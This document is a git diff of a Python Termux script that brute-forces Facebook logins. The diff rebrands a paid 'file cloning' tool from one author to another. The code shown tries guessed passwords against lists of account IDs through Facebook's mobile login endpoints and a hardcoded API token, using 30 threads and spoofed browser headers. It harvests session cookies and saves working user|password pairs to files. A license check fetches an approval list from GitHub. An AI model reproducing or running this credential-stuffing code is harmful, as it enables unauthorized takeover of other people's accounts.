@@ -88,25 +88,13 @@ def jalan(z):
         time.sleep(0.01)
 
 def logo():
-	print("""%s
-           \033[0;37m ##     ##    ###    ##     ## ########  #### 
-           \033[1;92m ###   ###   ## ##   ##     ## ##     ##  ##
-           \033[1;93m #### ####  ##   ##  ##     ## ##     ##  ##  
-           \033[1;91m ## ### ## ##     ## ######### ##     ##  ##
-           \033[1;92m ##     ## ######### ##     ## ##     ##  ##
-           \033[1;93m ##     ## ##     ## ##     ## ##     ##  ##  
-           \033[1;33m ##     ## ##     ## ##     ## ########  ####
-             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
-             \033[1;93m▇▇➣    \033[1;91mAUTHOR   : MAHDI HASAN        \033[1;93m▇▇
-             \033[1;93m▇▇➣    \033[1;94mGITHUB   : MAHDI HASAN        \033[1;93m▇▇
-             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : MAHDI HASAN        \033[1;93m▇▇
-             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801616406924     \033[1;93m▇▇
-             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID          \033[1;93m▇▇
-             \033[1;93m▇▇➣    \033[1;94mGIVE ME 300 tk FOR APRVAL     \033[1;93m▇▇
-             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
-             
-
-"""%(O))
+	print("""\x1b[1;97m88888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db
+88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
+88oobY' 88ooo88 88oooo   `8bo.  88ooo88 88V8o 88
+88`8b   88°°°88 88°°°°    `Y8b. 88°°°88 88 V8o88 
+88 `88. 88   88 88      db   8D 88   88 88  V888 
+88   YD YP   YP YP      `8888Y' YP   YP VP   V8P 
+""")
 
 def reg():
     os.system('termux-setup-storage')
@@ -120,7 +108,7 @@ def reg():
         to = open('/sdcard/Android/.bs7nt.txt', 'r').read()
     except (KeyError, IOError):
         reg2()
-    r = requests.get('https://raw.githubusercontent.com/R4FSAN-143/approval/main/ap.txt').text
+    r = requests.get('https://raw.githubusercontent.com/R4FSAN-143/FILE-69/main/ap.txt').text
     if to in r:
         time.sleep(2)
         bsn_menu()
@@ -154,8 +142,8 @@ def reg2():
     name = input("               YOUR NAME : ")
     input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
     time.sleep(3.5)
-    tks = 'Dear%20MAHDI-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
-    os.system('am start https://wa.me/+8801616406924?text=' + tks)
+    tks = 'Dear%20RAFSAN-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
+    os.system('am start https://wa.me/+8801305504954?text=' + tks)
     sav = open('/sdcard/Android/.bs7nt.txt', 'w')
     sav.write(id)
     sav.close()
@@ -190,12 +178,12 @@ def chigozie():
         exit('\n\n %s[%s!%s] tidak ada koneksi\n'%(O,O,O))
 def hasil(OK,cp):
     if len(OK) != 0 or len(cp) != 0:
-        print('\n----------------------------------------------')
-        print(' Your Process Complete...')
-        print('----------------------------------------------')
+        print("__________________________________________________")
+        print('                   Your Process Complete...')
+        print("__________________________________________________")
         print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mAdf-ok.txt'%(O,O,str(len(ok))))
         print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mAdf-cp.txt'%(O,O,str(len(cp))))
-        print('----------------------------------------------')
+        print('__________________________________________________')
         input(f"\n\033[1;97m Press Enter To Go Back ")
         bsn_menu()
 
@@ -204,14 +192,13 @@ def bsn_menu():
     logo()
     ipm = requests.get(url_ip).json() 
     IP = ipm["origin"]
-    print("             [*]. CREATED BY : MAHDI HASAN SHUVO");time.sleep (0.03)
-    print("             [*]. FACEBOOK   : MAHDI HASAN");time.sleep (0.03)
-    print("             [*]. GITHUB     : MAHDI HASAN");time.sleep (0.03)   
-    print("             [*]. VERSION    : 2.5.6");time.sleep (0.03)
-    print("             [*]. TOOL TYPE  : PAID");time.sleep (0.03)
-    print("             [*]. IP ADDRESS : [%s]\n"%(IP));time.sleep(0.01)
-    print("   \033[1;97m              Menu")
-    print("-----------------=\<------------------")
+    print("[*]. CREATED BY : R4FSAN-143");time.sleep (0.03)
+    print("[*]. FACEBOOK   : MD. ARIF MIA");time.sleep (0.03)
+    print("[*]. GITHUB     : R4FSAN-143");time.sleep (0.03)   
+    print("[*]. VERSION    : 0.1");time.sleep (0.03)
+    print("[*]. TOOL TYPE  : PAID");time.sleep (0.03)
+    print("[*]. IP ADDRESS : [%s]\n"%(IP));time.sleep(0.01)
+    print("__________________________________________________")
     print(" [1] File Cloning")
     print(" [0] Exit")
     print("")
@@ -229,7 +216,7 @@ class __bsn__:
         os.system('clear')
         logo()
         print("              file crack menu")
-        print(' -------------------------------------------')
+        print('__________________________________________________')
         print('')
         self.cnt = input('%s [+] file name :%s '%(P,K))
         self.id = open(self.cnt).read().splitlines()
@@ -240,7 +227,7 @@ class __bsn__:
         if ___worldwide___ in ('yes','Yes','Y', 'y'):
             logo()
             print("              Method Menu")
-            print('-------------------------------------------')
+            print('__________________________________________________')
             print('')
             print(' [+] Method 1')
             print(' [+] Method 2')
@@ -253,7 +240,7 @@ class __bsn__:
     def __api__(self, user, __chi__):
         global ok,cp,loop
         for i in list('\|-/'):
-            sys.stdout.write(f'\r [FAHIM] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
+            sys.stdout.write(f'\r [R4FSAN-XD] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
             sys.stdout.flush()
         for pw in __chi__:
             pw = pw.lower()
@@ -261,10 +248,10 @@ class __bsn__:
             except: pass
             p = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
             if "access_token" in p:
-                print('\r [OK-MAHDI] %s | %s ' % (user,pw))
+                print('\r [R4FSAN-OK] %s | %s ' % (user,pw))
                 wrt = '%s|%s' % (user,pw)
                 ok.append(wrt)
-                open('fahim-ok.txt' , 'a').write('%s\n' % wrt)
+                open('R4FSAN-FILE-OK.txt' , 'a').write('%s\n' % wrt)
                 break
             elif "www.facebook.com" in p["error_msg"]:
                 try:
@@ -272,10 +259,10 @@ class __bsn__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print('\r%s \033[1;91m[CP-MAHDI] %s | %s ' % (K,user,pw))
+                    print('\r%s \033[1;91m[R4FSAN-CP] %s | %s ' % (K,user,pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('fahim-cp.txt' , 'a').write('%s\n' % wrt)
+                    open('R4FSAN-FILE-CP.txt' , 'a').write('%s\n' % wrt)
                     break
                 except (KeyError, IOError):
                     month = ''
@@ -283,10 +270,10 @@ class __bsn__:
                     year  = ''
                 except:
                     pass
-                print('\r%s \033[1;91m[CP-MAHDI] %s | %s ' % (K,user,pw))
+                print('\r%s \033[1;91m[R4FSAN-CP] %s | %s ' % (K,user,pw))
                 wrt = '%s|%s' % (user,pw)
                 cp.append(wrt)
-                open('fahim-cp.txt' , 'a').write('%s\n' % wrt)
+                open('R4FSAN-FILE-CP.txt' , 'a').write('%s\n' % wrt)
                 break
             else:
                 continue
@@ -294,7 +281,7 @@ class __bsn__:
 
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f'\r [MAHDI] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
+        sys.stdout.write(f'\r [R4FSAN-XD] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -303,7 +290,7 @@ class __bsn__:
                 header = {
                     "Host":cebok,
                     "upgrade-insecure-requests":"1",
-                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
+                    "user-agent":"Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1",
                     "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "dnt":"1",
                     "x-requested-with":"mark.via.gp",
@@ -313,8 +300,7 @@ class __bsn__:
                     "sec-fetch-dest":"document",
                     "referer":"https://m.facebook.com/",
                     "accept-encoding":"gzip, deflate br",
-                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
-                }
+                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
                 r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                 das = {
                     "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
@@ -322,15 +308,15 @@ class __bsn__:
                     "uid":user,
                     "flow":"login_no_pin",
                     "pass":pw,
-                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
-                }
+                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"}
+                
                 header1 = {
                     "Host":cebok,
                     "cache-control":"max-age=0",
                     "upgrade-insecure-requests":"1",
                     "origin":"https://"+cebok,
                     "content-type":"application/x-www-form-urlencoded",
-                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
+                    "user-agent":"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-J330FN/J330FNXXU2AQK8) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36",
                     "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                     "x-requested-with":"XMLHttpRequest",
                     "sec-fetch-site":"same-origin",
@@ -344,10 +330,10 @@ class __bsn__:
                 po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                 if 'c_user' in session.cookies.get_dict():
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    print(f'\r{H} [OK-MAHDI] {user} | {pw}')
+                    print(f'\r{H} [R4FSAN-OK] {user} | {pw}')
                     wrt = '%s|%s' % (user,pw)
                     ok.append(wrt)
-                    open('fahim-ok.txt' , 'a').write('%s\n' % wrt)
+                    open('R4FSAN-FILE-OK.txt' , 'a').write('%s\n' % wrt)
                     self.follow(session,coki)
                     break
                 elif 'checkpoint' in session.cookies.get_dict():
@@ -356,20 +342,20 @@ class __bsn__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('\r%s \033[1;91m[CP-MAHDI] %s | %s ' % (K,user,pw))
+                        print('\r%s \033[1;91m[R4FSAN] %s | %s ' % (K,user,pw))
                         wrt = '%s|%s' % (user,pw)
                         cp.append(wrt)
-                        open('fahim-cp.txt' , 'a').write('%s\n' % wrt)
+                        open('R4FSAN-FILE-CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
                         day   = ''
                         year  = ''
                     except:pass
-                    print('\r%s \033[1;91m[CP-MAHDI] %s | %s ' % (K,user,pw))
+                    print('\r%s \033[1;91m[R4FSAN-CP] %s | %s ' % (K,user,pw))
                     wrt = '%s|%s' % (user,pw)
                     cp.append(wrt)
-                    open('fahim-cp.txt' , 'a').write('%s\n' % wrt)
+                    open('R4FSAN-FILE-CP.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
@@ -391,7 +377,7 @@ class __bsn__:
             print('')
             print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
             print(' \033[1;97mYour Process Started in Background')
-            print('-------------------------------------------')
+            print('__________________________________________________')
             print('')
             with BilalBSN(max_workers=30) as kirim:
                 for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
@@ -413,7 +399,7 @@ class __bsn__:
             print('')
             print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
             print(' \033[1;97mYour Process Started in Background')
-            print('-------------------------------------------')
+            print('__________________________________________________')
             print('')
             with BilalBSN(max_workers=30) as kirim:
                 for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
@@ -436,7 +422,7 @@ class __bsn__:
             print('')
             print(' \033[1;97m[+] Total IDs : %s%s' %(len(self.id),O))
             print(' \033[1;97mYour Process Started in Background')
-            print('-------------------------------------------')
+            print('__________________________________________________')
             print('')
             with BilalBSN(max_workers=30) as kirim:
                 for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
